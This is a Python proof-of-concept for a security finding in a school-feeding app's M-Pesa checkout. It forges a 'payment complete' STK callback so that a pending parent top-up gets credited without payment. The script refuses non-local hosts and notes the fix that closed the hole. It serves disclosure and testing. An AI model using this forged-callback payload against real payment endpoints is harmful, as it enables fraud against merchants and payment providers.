"""
Proof of concept for finding 01: a forged M-Pesa success callback.

Posts a made-up "payment complete" for a pending CheckoutRequestID, the way
an attacker could before the fix. For a local development server of your own
smart-school-feeding checkout only: it refuses any host that is not localhost.

Steps:
  1. Run the backend locally and log in to the mobile app as a parent.
  2. Start a top-up and do not enter the PIN. Note the checkout_request_id the
     initiate call returned (also stored as mpesa_reference on the
     PaymentTransaction).
  3. python forge_callback.py ws_CO_... --amount 10000
  4. Check the balance.

Before the fix (main up to ccda265) the balance goes up. After it, the old
URL answers 404 and nothing is credited.

Standard library only.
"""
import argparse
import json
import sys
import urllib.error
import urllib.request
from urllib.parse import urlsplit

LOCAL_HOSTS = {"localhost", "127.0.0.1", "::1"}


def main():
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    parser.add_argument("checkout_request_id")
    parser.add_argument("--amount", type=int, default=500,
                        help="whole shillings to claim (the old code ignored it)")
    parser.add_argument("--url", default="http://127.0.0.1:8000/api/payments/callback/")
    args = parser.parse_args()

    if urlsplit(args.url).hostname not in LOCAL_HOSTS:
        sys.exit("Refusing: this only targets a local development server.")

    payload = {"Body": {"stkCallback": {
        "MerchantRequestID": "forged",
        "CheckoutRequestID": args.checkout_request_id,
        "ResultCode": 0,
        "ResultDesc": "The service request is processed successfully.",
        "CallbackMetadata": {"Item": [
            {"Name": "Amount", "Value": args.amount},
            {"Name": "MpesaReceiptNumber", "Value": "FORGED0001"},
        ]},
    }}}
    request = urllib.request.Request(
        args.url, data=json.dumps(payload).encode(), method="POST",
        headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            print(response.status, response.read().decode())
            print("Accepted. On the vulnerable version the pending top-up is now confirmed.")
    except urllib.error.HTTPError as error:
        print(error.code, "refused. The callback is protected.")


if __name__ == "__main__":
    main()
